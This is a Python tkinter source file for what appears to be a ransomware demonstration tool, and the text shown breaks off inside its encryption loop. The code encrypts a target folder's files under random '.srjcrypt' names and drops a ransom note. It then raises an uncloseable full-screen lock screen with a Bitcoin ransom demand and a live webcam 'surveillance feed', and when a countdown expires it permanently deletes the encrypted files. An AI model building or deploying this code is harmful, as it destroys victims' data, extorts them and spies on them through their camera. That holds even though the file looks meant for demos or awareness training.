import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
import time
import json
import sys
import os
import random
import string
from PIL import Image, ImageTk

# Real webcam support:
try:
    import cv2
except Exception:
    cv2 = None
import datetime

from encryption.encryptor import encrypt_file as base_encrypt_file
from encryption.decryptor import decrypt_file as base_decrypt_file
from utils.file_scanner import get_target_files
from utils.drop_note import drop_ransom_note, remove_ransom_note
from response.auto_isolation import isolate_files, unisolate_files
from config import KEY_FILE, TARGET_EXTENSIONS

# --- PyInstaller-compatible resource path ---
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller .exe """
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

# ---- CONSTANTS AND COLORS ----
TARGET_DIR = {"path": None}
COUNTDOWN_STATE_FILE = "countdown_state.json"
encrypted_map_file = "encrypted_file_map.json"
encrypted_map_lock = threading.Lock()
countdown_seconds = [0]
stop_timer = [False]
fullscreen_window = None
fullscreen_timer_label = None
files_encrypted_label = None

COLORS = {
    'bg_primary': '#0a0a0a',
    'bg_secondary': '#1a1a1a',
    'bg_tertiary': '#2a2a2a',
    'accent_red': '#ff0040',
    'accent_orange': '#ff4500',
    'accent_cyan': '#00ffff',
    'accent_green': '#00ff41',
    'accent_yellow': '#ffff00',
    'text_primary': '#ffffff',
    'text_secondary': '#cccccc',
    'text_danger': '#ff3333',
    'warning': '#ffaa00'
}

FILES_TO_ENCRYPT = []
TOTAL_FILES = [0]
ENCRYPTED_COUNT = [0]

# ---- UTILITY FUNCTIONS ----
def save_countdown_state():
    try:
        with open(COUNTDOWN_STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump({"remaining": countdown_seconds[0]}, f)
    except Exception as e:
        print(f"[ERROR] Saving countdown state: {e}")

def load_countdown_state():
    if os.path.exists(COUNTDOWN_STATE_FILE):
        try:
            with open(COUNTDOWN_STATE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return int(data.get("remaining", 0))
        except Exception as e:
            print(f"[ERROR] Loading countdown state: {e}")
            return 0
    return 0

def delete_countdown_state():
    if os.path.exists(COUNTDOWN_STATE_FILE):
        try:
            os.remove(COUNTDOWN_STATE_FILE)
        except Exception as e:
            print(f"[ERROR] Deleting countdown state: {e}")

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ---- FILE ENCRYPTION/DECRYPTION WITH MAPPING ----
def encrypt_file(path):

    try:
        base_encrypt_file(path)
    except Exception as e:
        print(f"[ERROR] base_encrypt_file failed for {path}: {e}")
        return
    # Unique random name .srjcrypt
    for _ in range(100):
        new_name = f"{random_string()}.srjcrypt"
        new_path = os.path.join(os.path.dirname(path), new_name)
        if not os.path.exists(new_path):
            try:
                os.rename(path, new_path)
            except Exception as e:
                print(f"[ERROR] Renaming encrypted file: {e}")
                return
            with encrypted_map_lock:
                file_map = {}
                try:
                    if os.path.exists(encrypted_map_file):
                        with open(encrypted_map_file, 'r', encoding='utf-8') as f:
                            file_map = json.load(f)
                except Exception:
                    file_map = {}
                file_map[new_path] = path
                try:
                    with open(encrypted_map_file, 'w', encoding='utf-8') as f:
                        json.dump(file_map, f)
                except Exception as e:
                    print(f"[ERROR] Writing encrypted_map_file: {e}")
            return
    print("[ERROR] Failed to find unique .srjcrypt name (collision loop)")

def decrypt_file(path):
    """
    Uses mapping to restore original path after base decryption.
    """
    with encrypted_map_lock:
        file_map = {}
        try:
            if os.path.exists(encrypted_map_file):
                with open(encrypted_map_file, 'r', encoding='utf-8') as f:
                    file_map = json.load(f)
        except Exception:
            file_map = {}
        original_path = file_map.get(path)
        if original_path:
            try:
                base_decrypt_file(path)
                os.rename(path, original_path)
            except Exception as e:
                print(f"[ERROR] Decrypt/rename failed: {e}")
                return
            del file_map[path]
            try:
                with open(encrypted_map_file, 'w', encoding='utf-8') as f:
                    json.dump(file_map, f)
            except Exception as e:
                print(f"[ERROR] Updating encrypted_map_file: {e}")
        # Clean up if empty
        if not file_map and os.path.exists(encrypted_map_file):
            try:
                os.remove(encrypted_map_file)
            except Exception:
                pass

def destroy_files():
    """
    PERMANENT DELETION: Permanently delete all encrypted files referenced in the mapping.
    """
    file_map = {}
    try:
        with open(encrypted_map_file, 'r') as f:
            file_map = json.load(f)
        print("[DEBUG] Files to destroy (permanent):", list(file_map.keys()))
    except (FileNotFoundError, json.JSONDecodeError):
        print("[ERROR] Encrypted map file missing or corrupt.")
        file_map = {}

    for file in list(file_map.keys()):
        try:
            if os.path.exists(file):
                try:
                    os.remove(file)
                    print("[INFO] Permanently deleted:", file)
                except Exception as e:
                    print("[ERROR] Could not delete", file, ":", e)
            else:
                print("[WARN] File not found for deletion:", file)
        except Exception as e:
            print("[ERROR] Could not process", file, ":", e)

    # Remove the mapping file since files are deleted
    if os.path.exists(encrypted_map_file):
        try:
            os.remove(encrypted_map_file)
            print("[INFO] Encrypted map file deleted.")
        except Exception as e:
            print("[ERROR] Could not delete encrypted_map_file:", e)

    # Update UI: show a popup that destruction completed
    global fullscreen_window
    popup = tk.Toplevel(fullscreen_window)
    popup.title("💥 DATA DESTROYED")
    popup.geometry("500x200")
    popup.configure(bg=COLORS['bg_primary'])
    popup.attributes('-topmost', True)
    popup.grab_set()
    popup.focus_force()

    label = tk.Label(
        popup,
        text="Time expired. All encrypted files have been PERMANENTLY DESTROYED!",
        font=("Consolas", 14),
        fg=COLORS['accent_red'],
        bg=COLORS['bg_primary'],
        wraplength=480,
        justify="center"
    )
    label.pack(expand=True, padx=20, pady=40)

    def close_everything():
        if popup and popup.winfo_exists():
            popup.destroy()
        if fullscreen_window and hasattr(fullscreen_window, 'cancel_all_updates_and_destroy'):
            try:
                fullscreen_window.cancel_all_updates_and_destroy()
            except Exception as e:
                print("[ERROR] Could not close lock screen:", e)

    ok_btn = tk.Button(
        popup,
        text="OK",
        font=("Consolas", 12, "bold"),
        command=close_everything,
        bg=COLORS['accent_green'], fg=COLORS['bg_primary']
    )
    ok_btn.pack(pady=10)

    popup.after(5000, close_everything)

# ---- GUI WIDGETS ----
class AnimatedProgressBar:
    def __init__(self, parent, width=300, height=20, color=COLORS['accent_red']):
        self.canvas = tk.Canvas(parent, width=width, height=height, bg=COLORS['bg_primary'], highlightthickness=0)
        self.width = width
        self.height = height
        self.color = color
        self.progress = 0
    def set_progress(self, value):
        self.progress = max(0, min(100, value))
        self.update_display()
    def update_display(self):
        if not self.canvas.winfo_exists():
            return
        self.canvas.delete("all")
        prog_width = (self.progress / 100) * self.width
        self.canvas.create_rectangle(0, 0, self.width, self.height, fill=COLORS['bg_tertiary'], outline="")
        self.canvas.create_rectangle(0, 0, prog_width, self.height, fill=self.color, outline="")
        for i in range(3):
            self.canvas.create_rectangle(prog_width-3+i, 0, prog_width+3-i, self.height, fill=self.color, stipple="gray25")

class ThreatMeter:
    def __init__(self, parent, title, max_value=100):
        self.frame = tk.Frame(parent, bg=COLORS['bg_secondary'])
        self.title = title
        self.max_value = max_value
        self.current_value = 0
        tk.Label(self.frame, text=title, font=("Consolas", 10, "bold"),
                 fg=COLORS['text_primary'], bg=COLORS['bg_secondary']).pack()
        self.value_label = tk.Label(self.frame, text="0", font=("Consolas", 16, "bold"),
                                   fg=COLORS['accent_red'], bg=COLORS['bg_secondary'])
        self.value_label.pack()
        self.progress_bar = AnimatedProgressBar(self.frame, width=150, height=10)
        self.progress_bar.canvas.pack(pady=2)
    def update_value(self, value):
        self.current_value = value
        if self.value_label.winfo_exists():
            self.value_label.config(text=str(value), fg=self.get_color())
        if self.progress_bar.canvas.winfo_exists():
            self.progress_bar.set_progress((value / self.max_value) * 100)
    def get_color(self):
        if self.current_value < 30:
            return COLORS['accent_green']
        elif self.current_value < 70:
            return COLORS['accent_yellow']
        else:
            return COLORS['accent_red']

class SystemMonitor:
    def __init__(self, parent):
        self.frame = tk.Frame(parent, bg=COLORS['bg_secondary'], relief="raised", bd=2)
        title_frame = tk.Frame(self.frame, bg=COLORS['bg_primary'])
        title_frame.pack(fill="x", padx=2, pady=2)
        tk.Label(title_frame, text="🔍 SYSTEM STATUS MONITOR", font=("Consolas", 12, "bold"),
                 fg=COLORS['accent_cyan'], bg=COLORS['bg_primary']).pack()
        meters_frame = tk.Frame(self.frame, bg=COLORS['bg_secondary'])
        meters_frame.pack(fill="both", expand=True, padx=10, pady=5)
        self.threat_level = ThreatMeter(meters_frame, "THREAT LEVEL", 10)
        self.threat_level.frame.grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        self.infections = ThreatMeter(meters_frame, "INFECTIONS", 9999)
        self.infections.frame.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.data_breach = ThreatMeter(meters_frame, "DATA BREACH %", 100)
        self.data_breach.frame.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        self.network_intrusion = ThreatMeter(meters_frame, "NETWORK INTRUSION", 100)
        self.network_intrusion.frame.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        meters_frame.grid_columnconfigure(0, weight=1)
        meters_frame.grid_columnconfigure(1, weight=1)
        self._after_id = None
        self.start_updates()
    def start_updates(self):
        self.update_meters()
    def update_meters(self):
        try:
            self.threat_level.update_value(min(10, self.threat_level.current_value + random.randint(0, 1)))
            self.infections.update_value(min(9999, self.infections.current_value + random.randint(10, 100)))
            self.data_breach.update_value(min(100, self.data_breach.current_value + random.randint(1, 5)))
            self.network_intrusion.update_value(min(100, self.network_intrusion.current_value + random.randint(2, 8)))
            if (fullscreen_window and fullscreen_window.winfo_exists() and self.frame.winfo_exists()):
                self._after_id = fullscreen_window.after(1000, self.update_meters)
        except Exception as e:
            print(f"[ERROR] SystemMonitor update: {e}")
    def cancel_updates(self):
        if self._after_id:
            try:
                fullscreen_window.after_cancel(self._after_id)
            except Exception:
                pass
            self._after_id = None

class NetworkActivityFeed:
    def __init__(self, parent):
        self.frame = tk.Frame(parent, bg=COLORS['bg_secondary'], relief="raised", bd=2)
        title_frame = tk.Frame(self.frame, bg=COLORS['bg_primary'])
        title_frame.pack(fill="x", padx=2, pady=2)
        tk.Label(title_frame, text="🌐 NETWORK ACTIVITY LOG", font=("Consolas", 12, "bold"),
                 fg=COLORS['accent_orange'], bg=COLORS['bg_primary']).pack()
        self.log_text = tk.Text(self.frame, height=8, width=50, font=("Consolas", 8),
                                bg=COLORS['bg_primary'], fg=COLORS['accent_green'],
                                insertbackground=COLORS['accent_green'])
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)
        scrollbar = ttk.Scrollbar(self.frame, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        self._after_id = None
        self.start_activity_feed()
    def start_activity_feed(self):
        self.add_activity_line()
    def add_activity_line(self):
        try:
            activities = [
                ">>> Establishing connection to C&C server...",
                ">>> Scanning network topology...",
                ">>> Extracting authentication tokens...",
                ">>> Escalating privileges...",
                ">>> Enumerating domain controllers...",
                ">>> Exfiltrating credentials database...",
                ">>> Deploying payload to lateral targets...",
                ">>> Disabling Windows Defender...",
                ">>> Terminating backup processes...",
                ">>> Encrypting file system...",
                ">>> Broadcasting ransom demand...",
                ">>> Monitoring payment channels...",
                f">>> Connection from {'.'.join(str(random.randint(1,255)) for _ in range(4))}",
                f">>> Data upload: {random.randint(1,999)}MB transferred",
                f">>> {random.randint(100,9999)} files processed",
                ">>> Persistence mechanism installed",
                ">>> Registry modifications complete"
            ]
            timestamp = time.strftime("%H:%M:%S")
            activity = random.choice(activities)
            line = f"[{timestamp}] {activity}\n"
            if self.log_text.winfo_exists():
                self.log_text.insert(tk.END, line)
                self.log_text.see(tk.END)
            if (fullscreen_window and fullscreen_window.winfo_exists() and self.frame.winfo_exists()):
                self._after_id = fullscreen_window.after(random.randint(500, 2000), self.add_activity_line)
        except Exception as e:
            print(f"[ERROR] NetworkActivityFeed: {e}")
    def cancel_updates(self):
        if self._after_id:
            try:
                fullscreen_window.after_cancel(self._after_id)
            except Exception:
                pass
            self._after_id = None

class PulsingButton:
    def __init__(self, parent, text, command, **kwargs):
        self.frame = tk.Frame(parent, bg=kwargs.get('bg', COLORS['bg_primary']))
        self.button = tk.Button(self.frame, text=text, command=command,
                               font=("Consolas", 14, "bold"),
                               bg=COLORS['accent_green'], fg=COLORS['bg_primary'],
                               activebackground=COLORS['accent_yellow'],
                               activeforeground=COLORS['bg_primary'],
                               relief="raised", bd=3,
                               cursor="hand2")
        self.button.pack(padx=20, pady=10)
        self.pulse_active = False
        self._after_id = None
    def start_pulsing(self):
        self.pulse_active = True
        self.pulse()
    def stop_pulsing(self):
        self.pulse_active = False
        if self._after_id:
            try:
                fullscreen_window.after_cancel(self._after_id)
            except Exception:
                pass
            self._after_id = None
    def pulse(self):
        if not self.pulse_active or not self.button.winfo_exists():
            return
        current_bg = self.button.cget("bg")
        new_bg = COLORS['accent_yellow'] if current_bg == COLORS['accent_green'] else COLORS['accent_green']
        self.button.config(bg=new_bg)
        if (fullscreen_window and fullscreen_window.winfo_exists() and self.frame.winfo_exists()):
            self._after_id = fullscreen_window.after(500, self.pulse)

# ---- REAL WEBCAM (REPLACES SIMULATED WebcamSimulator) ----
class RealWebcam:
    def __init__(self, parent):
        self.parent = parent
        self.frame = tk.Frame(parent, bg=COLORS['bg_secondary'], relief="raised", bd=2)
        title_frame = tk.Frame(self.frame, bg=COLORS['bg_primary'])
        title_frame.pack(fill="x", padx=2, pady=2)
        tk.Label(title_frame, text="📹 SURVEILLANCE FEED (LIVE)", font=("Consolas", 12, "bold"),
                 fg=COLORS['accent_red'], bg=COLORS['bg_primary']).pack()
        self.canvas_w = 320
        self.canvas_h = 240
        self.canvas = tk.Canvas(self.frame, width=self.canvas_w, height=self.canvas_h, bg=COLORS['bg_primary'])
        self.canvas.pack(padx=5, pady=5)
        btn_frame = tk.Frame(self.frame, bg=COLORS['bg_secondary'])
        btn_frame.pack(fill="x")
        self.status_label = tk.Label(self.frame, text="● ACTIVE", font=("Consolas", 10, "bold"),
                                     fg=COLORS['accent_green'], bg=COLORS['bg_secondary'])
        self.status_label.pack()
        self.capture_btn = tk.Button(btn_frame, text="Capture", command=self.capture_frame,
                                     font=("Consolas", 10), bg=COLORS['accent_green'], fg=COLORS['bg_primary'])
        self.capture_btn.pack(side="left", padx=10, pady=6)
        self.use_real_camera = False
        self._stop_event = threading.Event()
        self._frame_image = None
        self._cv_cap = None
        self._reader_thread = None
        # Try to open camera; fallback automatically
        try:
            if cv2 is None:
                raise RuntimeError("OpenCV not installed")
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) if hasattr(cv2, 'CAP_DSHOW') else cv2.VideoCapture(0)
            if cap is None or not cap.isOpened():
                raise RuntimeError("Camera not available")
            # Configure resolution if needed
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.canvas_w)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.canvas_h)
            self._cv_cap = cap
            self.use_real_camera = True
            self.status_label.config(text="● LIVE CAMERA", fg=COLORS['accent_green'])
            self._reader_thread = threading.Thread(target=self._camera_reader, daemon=True)
            self._reader_thread.start()
        except Exception as e:
            print("[Webcam] Camera unavailable, using simulated feed:", e)
            self.use_real_camera = False
            self.status_label.config(text="● SIMULATED FEED", fg=COLORS['warning'])
            self._sim_after_id = None
            self._simulate_feed()

    def _camera_reader(self):
        """Background thread reading frames from cv2 and scheduling UI updates."""
        while not self._stop_event.is_set() and self._cv_cap and self._cv_cap.isOpened():
            ret, frame = self._cv_cap.read()
            if not ret:
                time.sleep(0.05)
                continue
            # Convert BGR to RGB
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            # Resize to canvas size (if needed)
            try:
                frame = cv2.resize(frame, (self.canvas_w, self.canvas_h))
            except Exception:
                pass
            pil = Image.fromarray(frame)
            tk_img = ImageTk.PhotoImage(pil)
            # save to instance to prevent GC
            self._frame_image = tk_img
            # Schedule update on main thread
            try:
                if fullscreen_window and fullscreen_window.winfo_exists() and self.canvas.winfo_exists():
                    fullscreen_window.after(0, lambda img=tk_img: self._update_canvas(img))
            except Exception as e:
                print("[Webcam] schedule update error:", e)
            time.sleep(1/25)  # ~25 FPS

    def _update_canvas(self, tk_img):
        try:
            self.canvas.delete("all")
            self.canvas.create_image(0, 0, anchor="nw", image=tk_img)
            # keep reference
            self.canvas.image = tk_img
        except Exception as e:
            print("[Webcam] update canvas error:", e)

    def _simulate_feed(self):
        """Fallback simulated feed (simple noise)"""
        try:
            self.canvas.delete("all")
            for _ in range(80):
                x = random.randint(0, self.canvas_w)
                y = random.randint(0, self.canvas_h)
                size = random.randint(1, 4)
                color = random.choice([COLORS['text_secondary'], COLORS['bg_tertiary'], COLORS['accent_green']])
                self.canvas.create_oval(x, y, x+size, y+size, fill=color, outline="")
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            self.canvas.create_text(10, 10, text=timestamp, font=("Consolas", 8),
                                    fill=COLORS['accent_yellow'], anchor="nw")
            if (fullscreen_window and fullscreen_window.winfo_exists() and self.frame.winfo_exists()):
                self._sim_after_id = fullscreen_window.after(200, self._simulate_feed)
        except Exception as e:
            print("[Webcam] simulate feed error:", e)

    def capture_frame(self):
        """Capture current frame (real or simulated) and save as bitmap. Also calls upload placeholder."""
        try:
            now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(TARGET_DIR["path"] if TARGET_DIR["path"] else ".", f"captured_{now}.bmp")
            if self.use_real_camera and self._cv_cap and self._cv_cap.isOpened():
                ret, frame = self._cv_cap.read()
                if ret:
                    # save BGR frame directly as BMP via OpenCV
                    try:
                        cv2.imwrite(filename, frame)
                    except Exception as e:
                        print("[Webcam] cv2.imwrite failed, fallback to PIL:", e)
                        self._save_canvas_bitmap(filename)
                else:
                    # fallback: capture canvas image
                    self._save_canvas_bitmap(filename)
            else:
                # simulated feed -> save canvas image
                self._save_canvas_bitmap(filename)
            print("[Webcam] Saved capture:", filename)
            # Placeholder: upload later (no actual network code here)
            try:
                threading.Thread(target=self.upload_to_cloud, args=(filename,), daemon=True).start()
            except Exception:
                pass
        except Exception as e:
            print("[Webcam] capture error:", e)

    def _save_canvas_bitmap(self, filename):
        # Create a simple BMP from the displayed image if available or a blank image
        try:
            if hasattr(self.canvas, "image") and isinstance(self.canvas.image, ImageTk.PhotoImage):
                # We can't reliably extract raw bytes from PhotoImage across platforms;
                # instead create a blank image as safe fallback (this is simulation).
                pil_img = Image.new("RGB", (self.canvas_w, self.canvas_h), color=(20, 20, 20))
                pil_img.save(filename, format="BMP")
            else:
                pil_img = Image.new("RGB", (self.canvas_w, self.canvas_h), color=(10,10,10))
                pil_img.save(filename, format="BMP")
        except Exception as e:
            print("[Webcam] _save_canvas_bitmap error:", e)
            # last-resort: create blank bitmap
            try:
                Image.new("RGB", (self.canvas_w, self.canvas_h), color=(10,10,10)).save(filename, format="BMP")
            except Exception as e2:
                print("[Webcam] fallback save failed:", e2)

    def upload_to_cloud(self, filepath):
        """Placeholder: implement your cloud upload here if desired (not implemented by default)."""
        try:
            # Implement your upload logic here; keep in mind privacy and consent.
            pass
        except Exception as e:
            print("[Webcam] upload error:", e)

    def cancel_updates(self):
        # Stop reader thread and release camera
        try:
            self._stop_event.set()
            if self._cv_cap and hasattr(self._cv_cap, 'isOpened') and self._cv_cap.isOpened():
                try:
                    self._cv_cap.release()
                except Exception:
                    pass
            # cancel simulated feed if scheduled
            if hasattr(self, "_sim_after_id") and self._sim_after_id:
                try:
                    fullscreen_window.after_cancel(self._sim_after_id)
                except Exception:
                    pass
        except Exception as e:
            print("[Webcam] cancel error:", e)

# ---- ENHANCED LOCKED SCREEN ----
def show_enhanced_locked_screen():
    global fullscreen_window, fullscreen_timer_label, files_encrypted_label
    countdown_seconds[0] = 180 # 3 minutes for demo
    fullscreen_window = tk.Toplevel(root)
    fullscreen_window.title("SECURITY BREACH DETECTED")
    fullscreen_window.attributes("-fullscreen", True)
    fullscreen_window.config(bg=COLORS['bg_primary'])
    fullscreen_window.protocol("WM_DELETE_WINDOW", lambda: None)
    fullscreen_window.attributes("-topmost", True)
    fullscreen_window.focus_force()
    fullscreen_window.grab_set()
    try:
        main_container = tk.Frame(fullscreen_window, bg=COLORS['bg_primary'])
        main_container.pack(fill="both", expand=True, padx=20, pady=20)
        # HEADER/Warning
        header_frame = tk.Frame(main_container, bg=COLORS['bg_primary'])
        header_frame.pack(fill="x", pady=(0, 20))
        warning_frame = tk.Frame(header_frame, bg=COLORS['bg_primary'])
        warning_frame.pack()
        tk.Label(warning_frame, text="⚠️ YOUR SYSTEM HAS BEEN COMPROMISED DO NOT POWER OFF OR DISCONNECT ⚠️",
                 font=("Consolas", 24, "bold"), fg=COLORS['text_danger'],
                 bg=COLORS['bg_primary']).pack(pady=5)
        # Content panels
        content_frame = tk.Frame(main_container, bg=COLORS['bg_primary'])
        content_frame.pack(fill="both", expand=True)
        left_panel = tk.Frame(content_frame, bg=COLORS['bg_secondary'], relief="raised", bd=2)
        left_panel.pack(side="left", fill="both", expand=True, padx=(0, 10))
        threat_info = tk.Frame(left_panel, bg=COLORS['bg_secondary'])
        threat_info.pack(fill="x", padx=10, pady=10)
        tk.Label(threat_info, text="⚠️ THREAT CLASSIFICATION: LEVEL 10",
                 font=("Consolas", 12, "bold"), fg=COLORS['accent_orange'],
                 bg=COLORS['bg_secondary']).pack(anchor="w")
        tk.Label(threat_info, text="🔒 ENCRYPTION: AES-256 + RSA-4096",
                 font=("Consolas", 10), fg=COLORS['text_primary'],
                 bg=COLORS['bg_secondary']).pack(anchor="w", pady=2)
        tk.Label(threat_info, text="🌐 ATTACK VECTOR: Advanced Persistent Threat",
                 font=("Consolas", 10), fg=COLORS['text_primary'],
                 bg=COLORS['bg_secondary']).pack(anchor="w", pady=2)
        files_encrypted_label = tk.Label(
            threat_info,
            text=f"📊 FILES ENCRYPTED: {ENCRYPTED_COUNT[0]} / {TOTAL_FILES[0]}",
            font=("Consolas", 10), fg=COLORS['accent_cyan'],
            bg=COLORS['bg_secondary'])
        files_encrypted_label.pack(anchor="w", pady=2)
        # Timer
        timer_frame = tk.Frame(left_panel, bg=COLORS['bg_primary'], relief="sunken", bd=3)
        timer_frame.pack(fill="x", padx=10, pady=20)
        tk.Label(timer_frame, text="⏰ TIME REMAINING UNTIL DATA DESTRUCTION",
                 font=("Consolas", 12, "bold"), fg=COLORS['accent_yellow'],
                 bg=COLORS['bg_primary']).pack(pady=5)
        fullscreen_timer_label = tk.Label(timer_frame, text="",
                                          font=("Consolas", 28, "bold"),
                                          fg=COLORS['accent_red'], bg=COLORS['bg_primary'])
        fullscreen_timer_label.pack(pady=10)
        # Payment instructions
        payment_frame = tk.Frame(left_panel, bg=COLORS['bg_secondary'])
        payment_frame.pack(fill="x", padx=10, pady=10)
        tk.Label(payment_frame, text="💰 RECOVERY PAYMENT REQUIRED",
                 font=("Consolas", 14, "bold"), fg=COLORS['accent_green'],
                 bg=COLORS['bg_secondary']).pack(pady=5)
        tk.Label(payment_frame, text="Amount: 2.5 BTC (~$65,000 USD)",
                 font=("Consolas", 12), fg=COLORS['text_primary'],
                 bg=COLORS['bg_secondary']).pack()
        tk.Label(payment_frame, text="Bitcoin Address:",
                 font=("Consolas", 10), fg=COLORS['text_secondary'],
                 bg=COLORS['bg_secondary']).pack(pady=(10, 2))
        tk.Label(payment_frame, text="bc1qxy4v5nq7s8td8nzc7t2m89klsqp1wr5jxh6n4z",
                 font=("Consolas", 11, "bold"), fg=COLORS['accent_cyan'],
                 bg=COLORS['bg_secondary']).pack()
        # QR code display
        try:
            qr_img = Image.open(resource_path("qr.png"))
            qr_img = qr_img.resize((100, 100), Image.Resampling.LANCZOS)
            qr_photo = ImageTk.PhotoImage(qr_img)
            qr_label = tk.Label(payment_frame, image=qr_photo, bg=COLORS['bg_secondary'])
            qr_label.image = qr_photo
            qr_label.pack(pady=10)
        except Exception as e:
            print(f"[QR Code error]: {e}")
            tk.Label(payment_frame, text="[QR CODE]", font=("Consolas", 10),
                     fg=COLORS['text_secondary'], bg=COLORS['bg_tertiary'],
                     width=10, height=6).pack(pady=10)
        # 'I Have Paid' button and right panel
        def on_i_have_paid():
            simulate_payment()
        global pay_btn, system_monitor, network_feed, webcam_sim
        pay_btn = PulsingButton(payment_frame, "I HAVE PAID", on_i_have_paid)
        pay_btn.frame.pack(pady=10)
        pay_btn.start_pulsing()
        right_panel = tk.Frame(content_frame, bg=COLORS['bg_primary'])
        right_panel.pack(side="right", fill="both", padx=(10, 0))
        system_monitor = SystemMonitor(right_panel)
        system_monitor.frame.pack(fill="x", pady=(0, 10))
        network_feed = NetworkActivityFeed(right_panel)
        network_feed.frame.pack(fill="both", expand=True, pady=(0, 10))
        # Use RealWebcam here:
        webcam_sim = RealWebcam(right_panel)
        webcam_sim.frame.pack(fill="x")
        # Ensure all updaters are cancelled on close
        def cancel_all_updates_and_destroy():
            try: system_monitor.cancel_updates()
            except: pass
            try: network_feed.cancel_updates()
            except: pass
            try: webcam_sim.cancel_updates()
            except: pass
            try: pay_btn.stop_pulsing()
            except: pass
            fullscreen_window.grab_release()
            fullscreen_window.destroy()
        fullscreen_window.cancel_all_updates_and_destroy = cancel_all_updates_and_destroy
        fullscreen_window.after(0, update_enhanced_countdown)
    except Exception as e:
        print("Error in locked screen creation:", e)

def update_enhanced_countdown():
    if countdown_seconds[0] <= 0:
        if fullscreen_timer_label and fullscreen_timer_label.winfo_exists():
            fullscreen_timer_label.config(text="TIME EXPIRED!", fg=COLORS['accent_red'])
        destroy_files()  # now permanently deletes files
        return
    else:
        hours, remainder = divmod(countdown_seconds[0], 3600)
        minutes, seconds = divmod(remainder, 60)
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        if fullscreen_timer_label and fullscreen_timer_label.winfo_exists():
            fullscreen_timer_label.config(text=time_str)
        countdown_seconds[0] -= 1
        save_countdown_state()
        if fullscreen_window and fullscreen_window.winfo_exists():
            fullscreen_window.after(1000, update_enhanced_countdown)

def simulate_payment():
    stop_timer[0] = True
    delete_countdown_state()
    processing_window = tk.Toplevel(fullscreen_window)
    processing_window.title("Payment Processing")
    processing_window.geometry("450x200")
    processing_window.configure(bg=COLORS['bg_primary'])
    processing_window.resizable(False, False)
    processing_window.attributes("-topmost", True)
    processing_window.transient(fullscreen_window)
    processing_window.grab_set()
    processing_window.update_idletasks()
    x = (processing_window.winfo_screenwidth() // 2) - (450 // 2)
    y = (processing_window.winfo_screenheight() // 2) - (200 // 2)
    processing_window.geometry(f"450x200+{x}+{y}")
    tk.Label(processing_window, text="🔄 PROCESSING PAYMENT...",
             font=("Consolas", 14, "bold"), fg=COLORS['accent_green'],
             bg=COLORS['bg_primary']).pack(pady=20)
    progress_frame = tk.Frame(processing_window, bg=COLORS['bg_primary'])
    progress_frame.pack(pady=10)
    progress_bar = AnimatedProgressBar(progress_frame, width=300, height=20, color=COLORS['accent_green'])
    progress_bar.canvas.pack()
    status_label = tk.Label(processing_window, text="Verifying blockchain transaction...",
                            font=("Consolas", 10), fg=COLORS['text_secondary'],
                            bg=COLORS['bg_primary'])
    status_label.pack(pady=10)
    def process_payment():
        stages = [
            (20, "Connecting to payment gateway..."),
            (40, "Verifying Bitcoin transaction..."),
            (60, "Confirming payment amount..."),
            (80, "Generating decryption keys..."),
            (100, "Payment confirmed! Starting decryption...")
        ]
        for progress, message in stages:
            if progress_frame.winfo_exists() and status_label.winfo_exists() and progress_bar.canvas.winfo_exists():
                def update_progress(progress=progress, message=message):
                    progress_bar.set_progress(progress)
                    status_label.config(text=message)
                    processing_window.update()
                root.after(0, update_progress)
                time.sleep(1.5)
        # Decrypt all files
        with encrypted_map_lock:
            file_map = {}
            try:
                if os.path.exists(encrypted_map_file):
                    with open(encrypted_map_file, 'r', encoding='utf-8') as f:
                        file_map = json.load(f)
            except Exception:
                file_map = {}
        for encrypted_path in list(file_map.keys()):
            if os.path.exists(encrypted_path):
                root.after(0, lambda ep=encrypted_path: decrypt_file(ep))
        root.after(0, lambda: remove_ransom_note(TARGET_DIR["path"]))
        def close_processing_and_show_success():
            if processing_window and processing_window.winfo_exists():
                processing_window.destroy()
            if fullscreen_window and hasattr(fullscreen_window, 'cancel_all_updates_and_destroy'):
                fullscreen_window.cancel_all_updates_and_destroy()
            success_window = tk.Toplevel(root)
            success_window.title("Decryption Complete")
            success_window.geometry("400x150")
            success_window.configure(bg=COLORS['bg_primary'])
            success_window.attributes("-topmost", True)
            tk.Label(success_window, text="✅ DECRYPTION SUCCESSFUL",
                     font=("Consolas", 16, "bold"), fg=COLORS['accent_green'],
                     bg=COLORS['bg_primary']).pack(pady=20)
            tk.Label(success_window, text="All files have been restored successfully!",
                     font=("Consolas", 12), fg=COLORS['text_primary'],
                     bg=COLORS['bg_primary']).pack(pady=10)
            tk.Button(success_window, text="Close", command=success_window.destroy,
                      font=("Consolas", 10), bg=COLORS['accent_green'],
                      fg=COLORS['bg_primary']).pack(pady=10)
        root.after(1000, close_processing_and_show_success)
    threading.Thread(target=process_payment, daemon=True).start()

# ---- FILE ENCRYPTION THREAD ----
def encrypt_files_with_progress():
    """
    Encrypts files (calls encrypt_file per file) and updates UI safely.
    """
    for idx, file in enumerate(FILES_TO_ENCRYPT, 1):
        encrypt_file(file)
        ENCRYPTED_COUNT[0] = idx
        def updater(n=ENCRYPTED_COUNT[0], t=TOTAL_FILES[0]):
            try:
                if files_encrypted_label and files_encrypted_label.winfo_exists():
                    files_encrypted_label.config(
                        text=f"📊 FILES ENCRYPTED: {n} / {t}"
                    )
            except Exception:
                pass
        # schedule safe UI update
        try:
            if fullscreen_window and fullscreen_window.winfo_exists():
                fullscreen_window.after(0, updater)
            else:
                root.after(0, updater)
